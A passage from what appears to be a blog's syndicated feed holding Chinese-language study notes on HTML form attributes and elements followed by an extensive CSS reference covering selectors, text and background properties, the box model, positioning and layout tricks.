class="line">target=&quot;value&quot;</span><br><span class="line"><span class="comment">/* value：_self：当前窗口（默认，用于顺序访问结构），_blank：新窗口（用于平行访问结构），_parent：父窗口，_top：顶级窗口。如果当前页面是在一个iframe中打开的，使用&quot;_parent&quot;会在iframe的父级页面中打开链接，而使用&quot;_top&quot;会在整个浏览器窗口中打开链接。*/</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*数据名字。name：提交数据的参数名*/</span></span><br><span class="line">name=&quot;name&quot; <span class="comment">/*或 id=&quot;name&quot;*/</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*鼠标放置提示*/</span></span><br><span class="line">title=&quot;title&quot;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*提交地址*/</span></span><br><span class="line">action=&quot;url&quot;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*提交方式。value：get，post*/</span></span><br><span class="line">method=&quot;value&quot;</span><br></pre></td></tr></table></figure><h4 id="3-6-表单元素"><a href="#3-6-表单元素" class="headerlink" title="3.6 表单元素"></a>3.6 表单元素</h4><figure class="highlight css"><table><tr><td class="code"><pre><span class="line"><span class="comment">/*元素类型*/</span></span><br><span class="line">type=&quot;value&quot;</span><br><span class="line"><span class="comment">/*value：</span></span><br><span class="line"><span class="comment">text（文本框），password（密码框），radio（单选框），checkbox（复选框），file（文件），hidden（隐藏域），botton（普通按钮），submit（提交按钮），reset（重置按钮），date（日期框）</span></span><br><span class="line"><span class="comment">radio（单选框），checkbox（复选框）：用name选定组</span></span><br><span class="line"><span class="comment">hidden（隐藏域）：看不见，但是可提交数据*/</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*元素默认值*/</span></span><br><span class="line">value=&quot;value&quot;</span><br><span class="line"><span class="comment">/*最大长度：*/</span></span><br><span class="line">maxlength=&quot;num&quot;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*聚焦对象。id填聚焦对象的id*/</span></span><br><span class="line">for=&quot;id&quot;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*可多选*/</span></span><br><span class="line">multiple=&quot;multiple&quot;</span><br><span class="line"><span class="comment">/*禁止提交*/</span></span><br><span class="line">disabled=&quot;disabled&quot;</span><br><span class="line"><span class="comment">/*只读：*/</span></span><br><span class="line">readonly=&quot;readonly&quot;</span><br><span class="line"><span class="comment">/*默认选中项*/</span></span><br><span class="line">selected=&quot;selected&quot;</span><br></pre></td></tr></table></figure><h4 id="3-7-字符实体"><a href="#3-7-字符实体" class="headerlink" title="3.7 字符实体"></a>3.7 字符实体</h4><ul><li>&lt;：<code>&amp;lt;</code></li><li>>：<code>&amp;gt;</code></li><li>空格：<code>&amp;nbsp;</code></li><li>版权：<code>&amp;copy;</code></li></ul><hr><h1 id="CSS"><a href="#CSS" class="headerlink" title="CSS"></a>CSS</h1><blockquote><p><a href="https://www.w3school.com.cn/css/index.asp">CSS教程</a></p></blockquote><hr><h2 id="一、基础-1"><a href="#一、基础-1" class="headerlink" title="一、基础"></a>一、基础</h2><h3 id="1-基本语法"><a href="#1-基本语法" class="headerlink" title="1 基本语法"></a>1 基本语法</h3><blockquote><ol><li>css声明要以分号结尾，声明要用{}括起。</li><li>一行写一个声明。</li><li>如果属性值是多单词组成，要加上引号。</li></ol></blockquote><figure class="highlight css"><table><tr><td class="code"><pre><span class="line"><span class="comment">/*选择器名 &#123; 属性 : 属性值 ; ... &#125;*/</span></span><br><span class="line"><span class="selector-tag">div</span> &#123; <span class="attribute">background-color</span>: red; &#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* label.calss：标签下的类 */</span></span><br></pre></td></tr></table></figure><h3 id="2-基本使用"><a href="#2-基本使用" class="headerlink" title="2 基本使用"></a>2 基本使用</h3><blockquote><p><a href="https://www.cnblogs.com/my--sunshine/p/6872224.html">link和import区别</a></p><p>代码嵌入方式：</p><ol><li>行内式：定义在标签中。</li><li>嵌入式：开辟一段属于css的代码，通常在<code>&lt;head&gt;</code>中嵌套，之后再在body中使用该标签会有对应的属性。</li><li>引入外联样式文件：先定义好再直接引用。新建css文件——选择器，例：<code>p &#123;color:red;&#125;</code>。</li></ol><p>优先级：样式代码距离应用代码的距离，越近越先执行。</p></blockquote><figure class="highlight css"><table><tr><td class="code"><pre><span class="line"><span class="comment">/*1.行内式*/</span></span><br><span class="line">&lt;<span class="selector-tag">p</span> style=&quot; ... &quot; &gt;&lt;/<span class="selector-tag">p</span>&gt;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*2.嵌入式*/</span></span><br><span class="line">&lt;style type=&quot;text/css&quot;&gt; <span class="selector-tag">p</span>&#123;<span class="attribute">color</span>:blue;<span class="attribute">font-size</span>:<span class="number">40px</span>;&#125; &lt;/style&gt;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*3.引入外联样式文件（rel：当前文件与引入的文件之间的关系）*/</span></span><br><span class="line">&lt;link rel=&quot;stylesheet&quot; type=&quot;text/css&quot; href=&quot;css<span class="comment">/*.css（路径）&quot; /&gt;</span></span><br></pre></td></tr></table></figure><hr><h2 id="二、选择器"><a href="#二、选择器" class="headerlink" title="二、选择器"></a>二、选择器</h2><h3 id="1-基本选择器"><a href="#1-基本选择器" class="headerlink" title="1 基本选择器"></a>1 基本选择器</h3><figure class="highlight css"><table><tr><td class="code"><pre><span class="line"><span class="comment">/*通用选择器*/</span></span><br><span class="line">* &#123; name:value; &#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*元素选择器*/</span></span><br><span class="line"><span class="selector-tag">label</span> &#123; name:value; &#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*id选择器*/</span></span><br><span class="line"><span class="selector-id">#id</span> &#123; name:value; &#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*类选择器*/</span></span><br><span class="line"><span class="selector-class">.class</span> &#123; name:value; &#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*组合选择器（或运算）*/</span></span><br><span class="line">selector1,selector2, ... &#123; name:value; &#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*属性选择器*/</span></span><br><span class="line"><span class="selector-tag">label</span><span class="selector-attr">[ title ]</span> ... &#123;&#125; <span class="comment">/*有title的标签*/</span></span><br><span class="line">lable<span class="selector-attr">[ title=value ]</span> <span class="comment">/*具体值匹配（标签中加上 title 属性）*/</span></span><br><span class="line"><span class="selector-tag">label</span><span class="selector-attr">[ title ^= t ]</span> <span class="comment">/*以 t 开头的 title*/</span></span><br><span class="line"><span class="selector-tag">label</span><span class="selector-attr">[ title $= 0]</span> <span class="comment">/*以 0 结尾的 title*/</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*优先级（权重）：!important(max) &gt; style(1000)&gt; id(100) &gt; class(10) &gt; label(1) &gt; * */</span></span><br><span class="line"><span class="comment">/*!important要写在分号前,优先级最高*/</span></span><br><span class="line"><span class="selector-tag">p</span>&#123;<span class="attribute">color</span>:red<span class="meta">!important</span>; &#125;      </span><br></pre></td></tr></table></figure><h3 id="2-组合选择器"><a href="#2-组合选择器" class="headerlink" title="2 组合选择器"></a>2 组合选择器</h3><figure class="highlight css"><table><tr><td class="code"><pre><span class="line"><span class="comment">/*后代选择器（派生选择器）：选择指定元素的所有后代元素（空格分割）*/</span></span><br><span class="line">selector1/<span class="selector-tag">label</span>   selector2/<span class="selector-tag">label</span> &#123; name:value; &#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*子代选择器：选择指定元素的第一代元素*/</span></span><br><span class="line">selector1/<span class="selector-tag">label</span> &gt; selector2/<span class="selector-tag">label</span> &#123; name:value; &#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*相邻兄弟选择器：选择指定元素的相邻的下一个元素（只向下找紧连一个）*/</span></span><br><span class="line">selector1/<span class="selector-tag">label</span> + selector2/<span class="selector-tag">label</span>  &#123; name:value; &#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*普通兄弟选择器：选择指定元素后的指定同级元素（只会向下找）*/</span></span><br><span class="line">selector1/<span class="selector-tag">label</span> ~ selector2/<span class="selector-tag">label</span>  &#123; name:value; &#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* 同一个类带空格的类名，直接点即可 */</span></span><br><span class="line">&lt;<span class="selector-tag">div</span> class=&quot;card mb-<span class="number">3</span>&quot;&gt;</span><br><span class="line"><span class="selector-class">.card</span><span class="selector-class">.mb-3</span>&#123;&#125;</span><br></pre></td></tr></table></figure><hr><h2 id="三、常用属性"><a href="#三、常用属性" class="headerlink" title="三、常用属性"></a>三、常用属性</h2><h3 id="1-伪类"><a href="#1-伪类" class="headerlink" title="1 伪类"></a>1 伪类</h3><figure class="highlight css"><table><tr><td class="code"><pre><span class="line"><span class="comment">/*得到焦点的控件的样式*/</span></span><br><span class="line"><span class="selector-tag">label</span><span class="selector-pseudo">:focus</span> &#123;&#125;</span><br><span class="line"><span class="comment">/*鼠标悬停的控件的样式*/</span></span><br><span class="line"><span class="selector-tag">label</span><span class="selector-pseudo">:hover</span> &#123;&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*文本前 / 后加文本*/</span></span><br><span class="line"><span class="selector-tag">label</span><span class="selector-pseudo">::before</span> / after &#123; <span class="attribute">content</span>: <span class="string">&quot;str&quot;</span> &#125;</span><br></pre></td></tr></table></figure><h3 id="2-background"><a href="#2-background" class="headerlink" title="2 background"></a>2 background</h3><blockquote><p><a href="https://developer.mozilla.org/zh-CN/docs/Web/CSS/gradient/linear-gradient">渐变色：linear-gradient()</a></p></blockquote><figure class="highlight css"><table><tr><td class="code"><pre><span class="line"><span class="comment">/*背景颜色。value：color，transparent（透明的），rgba(0,0,0,0)*/</span></span><br><span class="line"><span class="attribute">background-color</span>:value;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*背景图片 （默认重复显示）*/</span></span><br><span class="line"><span class="attribute">background-image</span>: <span class="built_in">url</span>(<span class="string"> url </span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">/*背景图片重复。value：no-repeat;repeat-x;repeat-y;repeat;*/</span></span><br><span class="line"><span class="attribute">background-repeat</span>:value;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*背景图片大小。size：lengthpx widthpx*/</span></span><br><span class="line"><span class="attribute">background-size</span>:size;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*背景图片滚动。balue：Scroll，Fixed(背景固定)*/</span></span><br><span class="line"><span class="attribute">background-attachment</span>:value;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*背景图片初始位置。value：n%、num、top、left、right、bottom、center*/</span></span><br><span class="line"><span class="attribute">background-position</span>:value;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*合集（可填之前所有属性值）*/</span></span><br><span class="line"><span class="attribute">background</span>:value;</span><br></pre></td></tr></table></figure><h3 id="3-text"><a href="#3-text" class="headerlink" title="3 text"></a>3 text</h3><figure class="highlight css"><table><tr><td class="code"><pre><span class="line"><span class="comment">/*文本颜色。value：同 html 的 text，两字符相同可缩写，例：# ff0000 = #f00*/</span></span><br><span class="line"><span class="attribute">color</span>:value;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*文本首行缩进。value：num em;（1em：1字符）*/</span></span><br><span class="line"><span class="attribute">text-indent</span>:value;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*文本对齐*/</span></span><br><span class="line"><span class="attribute">text-align</span>:value;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*单词间距（分词，仅英文）*/</span></span><br><span class="line"><span class="attribute">word-spacing</span>:size;</span><br><span class="line"><span class="comment">/*字母间距（分字，中英皆可）*/</span></span><br><span class="line"><span class="attribute">letter-spacing</span>:size;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*文本装饰。value：overline;underline;line-through;none;blink;（设置多值中间用空格隔开）*/</span></span><br><span class="line"><span class="attribute">text-decoration</span>:value;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*设置行高（可以用来垂直居中）*/</span></span><br><span class="line"><span class="attribute">line-height</span>:size;</span><br><span class="line"><span class="comment">/*垂直对齐。value：baseline、top、bottom、middle*/</span></span><br><span class="line"><span class="attribute">vertical-align</span>:value;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*文本阴影 offset-x | offset-y | blur-radius | color */</span></span><br><span class="line"><span class="attribute">text-shadow</span>:<span class="number">2px</span> <span class="number">2px</span> <span class="number">1px</span> <span class="built_in">rgba</span>(<span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0.2</span>);</span><br><span class="line"><span class="comment">/*盒子阴影 x 偏移量 | y 偏移量 | 阴影模糊半径 | 阴影颜色 */</span></span><br><span class="line"><span class="attribute">box-shadow</span>:<span class="number">2px</span> <span class="number">2px</span> <span class="number">1px</span> <span class="built_in">rgba</span>(<span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0.2</span>);</span><br></pre></td></tr></table></figure><h3 id="4-font"><a href="#4-font" class="headerlink" title="4 font"></a>4 font</h3><blockquote><p><a href="https://fontawesome.com/">official::Font Awesome</a></p><p><a href="https://www.iconfont.cn/">阿里巴巴图标库</a></p></blockquote><figure class="highlight css"><table><tr><td class="code"><pre><span class="line"><span class="comment">/*字体效果（字体尽量用图片显示）*/</span></span><br><span class="line"><span class="attribute">font-family</span>:value;</span><br><span class="line"><span class="comment">/*value：带空格的单词应带上引号。多值中间用逗号隔开，当不识别第一个字体时会自动识别后续字体。*/</span></span><br><span class="line"><span class="comment">/*下载 icon*/</span></span><br><span class="line"><span class="keyword">@font-face</span>&#123; </span><br><span class="line">    <span class="attribute">font-family</span>:<span class="string">&#x27;iconfont&#x27;</span>;</span><br><span class="line">    <span class="attribute">src</span>:<span class="built_in">url</span>(<span class="string">&#x27;url&#x27;</span>); </span><br><span class="line">    format(&#x27;truetype&#x27;); &#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*字体大小*/</span></span><br><span class="line"><span class="attribute">font-size</span>:size;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*字体风格.value：normal;italic（斜体）;oblique（强制倾斜）;*/</span></span><br><span class="line"><span class="attribute">font-style</span>:value;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*字体粗细.value：100~900（越大越粗），bold（粗体，700），400（正常字体）*/</span></span><br><span class="line"><span class="attribute">font-weight</span>:value;</span><br></pre></td></tr></table></figure><h3 id="5-list"><a href="#5-list" class="headerlink" title="5 list"></a>5 list</h3><figure class="highlight css"><table><tr><td class="code"><pre><span class="line"><span class="comment">/*表头图标（图标一般用此实现）*/</span></span><br><span class="line"><span class="attribute">list-style-image</span>: <span class="built_in">url</span>(<span class="string">&quot;url&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">/*图标位置。value：inside，outside（图标在文本行内，外）*/</span></span><br><span class="line"><span class="attribute">list-style-position</span>: value;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*图标类型。同 ul 的 type*/</span></span><br><span class="line"><span class="attribute">list-style-type</span>: value;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*合集*/</span></span><br><span class="line"><span class="attribute">list-style</span>: value;</span><br></pre></td></tr></table></figure><h3 id="6-display"><a href="#6-display" class="headerlink" title="6 display"></a>6 display</h3><figure class="highlight css"><table><tr><td class="code"><pre><span class="line"><span class="comment">/*规定元素生成框的类型*/</span></span><br><span class="line"><span class="attribute">display</span>: value;</span><br><span class="line">block：元素会被显示，且元素会变成块级元素，元素前后会有换行符。</span><br><span class="line"><span class="attribute">none</span>：元素会被隐藏。（脱离文档流）</span><br><span class="line">inline：元素会显示为行内元素，元素前后没有换行符。</span><br><span class="line">inline-block：行内块级元素。</span><br><span class="line"><span class="attribute">flex</span>：弹性布局，设置于父元素，子元素会按格式显示，格式设置如下：</span><br><span class="line"><span class="comment">/*垂直居中*/</span></span><br><span class="line"><span class="attribute">align-items</span>: center;</span><br><span class="line"><span class="comment">/*水平居中*/</span></span><br><span class="line"><span class="attribute">justify-content</span>: center;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*文档可见（不脱离文档流）*/</span></span><br><span class="line"><span class="attribute">visibility</span>:visable / hidden;</span><br></pre></td></tr></table></figure><h3 id="7-float"><a href="#7-float" class="headerlink" title="7 float"></a>7 float</h3><blockquote><ol><li>只有横向浮动、没有纵向浮动。</li><li>会将元素的display属性变更为block。</li><li>浮动元素的后一个元素围绕着浮动元素。（典型运用是文字围绕图片）</li><li>浮动元素的前一个元素不会受到任何影响。（如何你想让两个块级元素并排显示，两个元素都应该有float属性）</li></ol></blockquote><figure class="highlight css"><table><tr><td class="code"><pre><span class="line"><span class="comment">/*浮动，脱离文档流，多用于横向排列场景 value：none、left、right*/</span></span><br><span class="line"><span class="attribute">float</span>:value;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*清除浮动（移动自己） value：left、right、both。*/</span></span><br><span class="line"><span class="attribute">clear</span>:value;</span><br></pre></td></tr></table></figure><hr><h2 id="四、盒子模型"><a href="#四、盒子模型" class="headerlink" title="四、盒子模型"></a>四、盒子模型</h2><h3 id="1-尺寸"><a href="#1-尺寸" class="headerlink" title="1 尺寸"></a>1 尺寸</h3><blockquote><p>W3C：宽高是蛋黄大小——content-box</p><p>Microsoft：宽高是蛋壳大小——border-box</p><p>默认W3C标准，修改：box-sizing : border-box ;</p></blockquote><figure class="highlight css"><table><tr><td class="code"><pre><span class="line"><span class="comment">/*宽，最小宽，最大宽*/</span></span><br><span class="line"><span class="attribute">width</span>，<span class="attribute">min-width</span>，<span class="attribute">max-width</span>：</span><br><span class="line"><span class="comment">/*高，最小高，最大高*/</span></span><br><span class="line"><span class="attribute">height</span>，<span class="attribute">min-height</span>，<span class="attribute">max-height</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*溢出，x轴溢出，y轴溢出，文本溢出*/</span></span><br><span class="line"><span class="attribute">overflow</span> / <span class="attribute">overflow-x</span> / <span class="attribute">overflow-y</span> / <span class="attribute">text-overflow</span>:value; </span><br><span class="line"><span class="comment">/*value：visible（可见，默认），hidden（隐藏），scroll（滚动条），auto（必要时加滚动条），clip（裁剪），ellipsis（省略号）*/</span></span><br></pre></td></tr></table></figure><h3 id="2-定位"><a href="#2-定位" class="headerlink" title="2 定位"></a>2 定位</h3><blockquote><p><a href="https://www.w3school.com.cn/cssref/pr_class_position.asp">w3c定位</a></p><p>relative：</p><ol><li>定位点：原点。</li><li>不脱离文档流。</li></ol><p>relative应用：</p><ol><li>一个容器中某个控件位置微调。</li><li>配合 absolute 。</li></ol><p>absolute： </p><ol><li><p>定位点：body，祖先是 relative 定位点则为祖先。</p></li><li><p>脱离文档流。</p></li></ol></blockquote><figure class="highlight css"><table><tr><td class="code"><pre><span class="line">定位方式：<span class="attribute">position</span> : value ;</span><br><span class="line">（value：static（静态，默认），relative（相对），fixed（固定），absolute（绝对））</span><br><span class="line"></span><br><span class="line">位置：<span class="attribute">top</span>，<span class="attribute">right</span>，<span class="attribute">bottom</span>，<span class="attribute">left</span></span><br><span class="line"></span><br><span class="line">形状：<span class="attribute">clip</span> : rect (top, right, bottom, left) ;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*移动*/</span></span><br><span class="line"><span class="attribute">transform</span>: <span class="built_in">translate</span>(<span class="number">12px</span>, <span class="number">50%</span>);</span><br><span class="line"><span class="attribute">transform</span>: <span class="built_in">translateX</span>(<span class="number">2em</span>);</span><br><span class="line"><span class="attribute">transform</span>: <span class="built_in">translateY</span>(<span class="number">3in</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">/*absolute 堆叠顺序*/</span></span><br><span class="line"><span class="attribute">z-index</span>:value;</span><br><span class="line"><span class="comment">/*value：num（正数离用户近，负数离用户远。谁大谁在上面）*/</span></span><br></pre></td></tr></table></figure><h3 id="3-margin"><a href="#3-margin" class="headerlink" title="3 margin"></a>3 margin</h3><blockquote><p>外边距：边框到外部的距离。</p><p>可设置多个元素，1：全部，2：上下 左右 3：上 左右 下 4：上 右 下 左。</p></blockquote><figure class="highlight css"><table><tr><td class="code"><pre><span class="line"><span class="comment">/*统一设置。value：auto（居中）*/</span></span><br><span class="line"><span class="attribute">margin</span>:value;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*单独设置*/</span></span><br><span class="line"><span class="attribute">margin-left</span></span><br><span class="line"><span class="attribute">margin-right</span></span><br><span class="line"><span class="attribute">margin-top</span></span><br><span class="line"><span class="attribute">margin-bottom</span></span><br></pre></td></tr></table></figure><h3 id="4-border"><a href="#4-border" class="headerlink" title="4 border"></a>4 border</h3><blockquote><p>边框：边框样式。</p><p><a href="https://developer.mozilla.org/zh-CN/docs/Web/CSS/border-radius">border-radius</a></p></blockquote><figure class="highlight css"><table><tr><td class="code"><pre><span class="line"><span class="comment">/*统一设置*/</span></span><br><span class="line"><span class="attribute">border</span>:width color style;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*单个设置（可设置多个元素，1：全部，2：上下 左右 3：上 左右 下 4：上 右 下 左）*/</span></span><br><span class="line"><span class="attribute">border-top</span></span><br><span class="line"><span class="attribute">border-bottom</span></span><br><span class="line"><span class="attribute">border-left</span></span><br><span class="line"><span class="attribute">border-right</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*边框样式*/</span></span><br><span class="line"><span class="attribute">border-style</span>:value;</span><br><span class="line"><span class="comment">/*value：none（无边框），dotted（点线），dashed（虚线），solid（实线），double（双边框），groove（3D沟槽）， ridge（3D脊边框）， inset（3D嵌入），outset（3D突出）*/</span></span><br><span class="line"></span><br><span class="line"><span class="attribute">border-color</span>:value;</span><br><span class="line"><span class="attribute">border-width</span>:value;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*合并边框。value：collapse（合并），separate（默认，独立）*/</span></span><br><span class="line"><span class="attribute">border-collapse</span>:value;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*圆角边框*/</span></span><br><span class="line"><span class="attribute">border-radius</span>:value;</span><br></pre></td></tr></table></figure><h3 id="5-outline"><a href="#5-outline" class="headerlink" title="5 outline"></a>5 outline</h3><blockquote><p>轮廓：和border很类似，但有如下区别：</p><ul><li>outline 不占据空间，绘制于元素内容周围。</li><li>根据规范，outline 通常是矩形，但也可以是非矩形的。</li></ul><p><a href="https://developer.mozilla.org/zh-CN/docs/Web/CSS/outline">outline</a></p></blockquote><h3 id="6-padding"><a href="#6-padding" class="headerlink" title="6 padding"></a>6 padding</h3><blockquote><p>内边距：内容到边框的内距。</p><p>可设置多个元素，1：全部，2：上下 左右 3：上 左右 下 4：上 右 下 左。</p></blockquote><figure class="highlight css"><table><tr><td class="code"><pre><span class="line"><span class="comment">/*统一设置*/</span></span><br><span class="line"><span class="attribute">padding</span>:value;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*单独设置*/</span></span><br><span class="line"><span class="attribute">padding-left</span></span><br><span class="line"><span class="attribute">padding-right</span></span><br><span class="line"><span class="attribute">padding-top</span></span><br><span class="line"><span class="attribute">padding-bottom</span></span><br></pre></td></tr></table></figure><hr><h2 id="五、技巧"><a href="#五、技巧" class="headerlink" title="五、技巧"></a>五、技巧</h2><h3 id="1-清空默认"><a href="#1-清空默认" class="headerlink" title="1 清空默认"></a>1 清空默认</h3><figure class="highlight css"><table><tr><td class="code"><pre><span class="line"><span class="comment">/*清空默认边距*/</span></span><br><span class="line"><span class="number">1</span>. *&#123; <span class="attribute">margin</span>: <span class="number">0</span>;<span class="attribute">padding</span>: <span class="number">0</span>; &#125;</span><br><span class="line"><span class="number">2</span>. reset<span class="selector-class">.css</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*清空超链接样式*/</span></span><br><span class="line"><span class="selector-tag">a</span> &#123; <span class="attribute">text-decoration</span>: none; &#125; <span class="comment">/*普通*/</span></span><br><span class="line"><span class="selector-tag">a</span><span class="selector-pseudo">:link</span> &#123; <span class="attribute">text-decoration</span>: none; &#125; <span class="comment">/*未访问*/</span></span><br><span class="line"><span class="selector-tag">a</span><span class="selector-pseudo">:visited</span> &#123; <span class="attribute">text-decoration</span>: none; &#125; <span class="comment">/*已访问*/</span></span><br><span class="line"><span class="selector-tag">a</span><span class="selector-pseudo">:hover</span> &#123; <span class="attribute">text-decoration</span>: none; &#125; <span class="comment">/*鼠标停留*/</span></span><br><span class="line"><span class="selector-tag">a</span><span class="selector-pseudo">:active</span> &#123; <span class="attribute">text-decoration</span>: none; &#125; <span class="comment">/*正在点击*/</span></span><br></pre></td></tr></table></figure><h3 id="2-整体布局"><a href="#2-整体布局" class="headerlink" title="2 整体布局"></a>2 整体布局</h3><blockquote><p>分块：</p><ul><li>一般可以将页面分成 12 列，盒子占位为 n 列。</li><li>width：设置最大为（width-20px）或（100%）（垂直滚动条占20px）</li><li>width：一般设置为一定大小（ 例：设置 960px ，页面为 1024px）</li></ul><p>盒子布局：</p><ul><li>套盒子：盒子中套盒子便于后期加减内容和板块移动。（例：container 中套 header，content 和 footer盒子，然后header盒子中又可以进行嵌套）</li></ul></blockquote><figure class="highlight css"><table><tr><td class="code"><pre><span class="line"><span class="comment">/* 登录框恒居页面中央 */</span></span><br><span class="line"><span class="selector-class">.login_page</span>&#123;</span><br><span class="line">    <span class="attribute">position</span>: absolute;</span><br><span class="line">    <span class="attribute">top</span>:<span class="number">50%</span>;</span><br><span class="line">    <span class="attribute">left</span>:<span class="number">50%</span>;</span><br><span class="line">    <span class="attribute">width</span>: <span class="number">960px</span>;</span><br><span class="line"><span class="attribute">height</span>: <span class="number">560px</span>;</span><br><span class="line">    <span class="attribute">margin-left</span>: -<span class="number">480px</span>; <span class="comment">/*调节如下两个属性来改变位置*/</span></span><br><span class="line">    <span class="attribute">margin-top</span>: -<span class="number">280px</span>;</span><br><span class="line"><span class="attribute">overflow</span>: hidden;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* 侧边栏设置 */</span></span><br><span class="line"><span class="attribute">float</span>: left;</span><br><span class="line"><span class="attribute">width</span>: num px;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* 侧边栏内容设置 */</span></span><br><span class="line"><span class="attribute">width</span>: <span class="built_in">calc</span>( <span class="number">100%</span> - num px );</span><br><span class="line"><span class="attribute">margin-left</span>: num px;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* 顶端栏置顶设置*/</span></span><br><span class="line"><span class="selector-class">.header</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="attribute">position</span>: fixed;</span><br><span class="line">    <span class="attribute">height</span>: <span class="number">45px</span>;</span><br><span class="line">    <span class="attribute">top</span>: <span class="number">0</span>;</span><br><span class="line">    <span class="attribute">left</span>: <span class="number">0</span>;</span><br><span class="line">    <span class="attribute">right</span>: <span class="number">0</span>;</span><br><span class="line">    <span class="attribute">z-index</span>: <span class="number">5</span>;</span><br><span class="line">    <span class="attribute">background-color</span>: <span class="number">#354498</span>; </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="3-盒子内容"><a href="#3-盒子内容" class="headerlink" title="3 盒子内容"></a>3 盒子内容</h3><figure class="highlight css"><table><tr><td class="code"><pre><span class="line"><span class="comment">/* 文本居中 */</span></span><br><span class="line"><span class="comment">/* 横向 */</span></span><br><span class="line"><span class="attribute">text-align</span>: center;</span><br><span class="line"><span class="comment">/* 纵向（设置后文本会自动居中） */</span></span><br><span class="line"><span class="attribute">line-height</span> : num px;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* 盒子居中（自适应居中） */</span></span><br><span class="line"><span class="attribute">margin</span>: <span class="number">0</span> auto; </span><br><span class="line"></span><br><span class="line"><span class="comment">/* 盒子重叠（设置color透明化） */</span></span><br><span class="line"><span class="attribute">color</span>: <span class="built_in">rgba</span>( , , ,<span class="number">0.5</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">/* 撑起盒子（容器中的盒子如果浮动会脱离容器） */</span></span><br><span class="line"><span class="comment">/* 1.盒子尾部加一个盒子，然后设置清除浮动 */</span></span><br><span class="line"><span class="attribute">clear</span>: left;</span><br><span class="line"><span class="comment">/* 2.盒子尾部加一个 */</span> </span><br><span class="line"><span class="selector-tag">p</span><span class="selector-pseudo">::after</span></span><br><span class="line"><span class="comment">/* 3.盒子溢出隐藏（缺点：有元素在容器之外将无法被显示） */</span></span><br><span class="line">container &#123; <span class="attribute">overflow</span>: hidden; &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">/* 图片盒子（用&lt;h2&gt;等标签替代&lt;img&gt;，然后设置背景，去掉文字）</span></span><br><span class="line"><span class="comment">去掉文字的两种方法 （方法一可能会被浏览器忽略导致不解析）*/</span></span><br><span class="line"><span class="attribute">font-size</span>: <span class="number">0px</span>;</span><br><span class="line"><span class="attribute">text-indent</span>: -<span class="number">9999px</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">/* 两个一起用进行换行 */</span></span><br><span class="line"><span class="comment">/* 保留空白符（空格、制表符等），但是允许文本换行。 */</span></span><br><span class="line"><span class="attribute">white-space</span>: pre-wrap;</span><br><span class="line"><span class="comment">/* 在单词内部换行，以避免单词溢出容器边界。 */</span></span><br><span class="line"><span class="attribute">word-wrap</span>: break-word;</span><br></pre></td></tr></table></figure><h3 id="4-函数"><a href="#4-函数" class="headerlink" title="4 函数"></a>4 函数</h3><figure class="highlight css"><table><tr><td class="code"><pre><span class="line"><span class="comment">/* 计算式 */</span></span><br><span class="line">calc(exp)</span><br><span class="line">calc(<span class="number">100%</span> - <span class="number">20px</span>)</span><br></pre></td></tr></table></figure><hr><h1 id="网页其他操作"><a href="#网页其他操作" class="headerlink" title="网页其他操作"></a>网页其他操作</h1><ol><li><p>html 转 pdf</p><blockquote><p>页面——打印pdf</p></blockquote></li></ol>]]></content>
      
      
      <categories>
          
          <category> Web </category>
          
      </categories>
      
